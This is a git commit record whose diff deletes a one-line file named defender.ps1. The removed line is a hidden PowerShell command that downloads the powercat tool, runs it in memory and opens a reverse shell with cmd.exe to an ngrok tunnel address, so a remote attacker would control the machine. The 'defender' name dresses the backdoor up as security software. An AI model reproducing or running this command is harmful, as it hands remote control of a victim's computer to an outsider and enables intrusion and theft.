fdf14bb44d4fd1b0fec2d29c3cf7adbe4ff7bd98
vladstanoiu <55551799+vladstanoiu@users.noreply.github.com>
2022-11-14 23:32:54 +0200

    Delete defender.ps1

--- defender.ps1
+++
@@ -1,1 +0,0 @@
-powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c tcp://0.tcp.eu.ngrok.io -p 17319 -e cmd"
